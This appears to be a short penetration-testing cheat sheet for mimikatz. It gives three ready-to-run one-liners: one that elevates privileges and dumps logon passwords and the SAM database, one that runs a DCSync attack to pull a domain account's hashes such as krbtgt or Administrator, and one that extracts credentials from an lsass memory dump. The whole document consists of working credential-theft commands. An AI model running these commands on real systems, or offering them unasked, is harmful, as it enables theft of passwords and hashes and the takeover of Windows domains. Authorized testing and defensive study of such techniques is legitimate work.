# mimikatz

% mimikatz, passwords

## mimikatz onliner
```
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

## mimikatz dcsync - user (krbtgt/Administrator)
```
mimikatz "privilege::debug" "lsadump::dcsync /domain:<domain> /user:<user>" "exit"
```

## mimikatz extract credentials from dump
```
mimikatz "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"
```
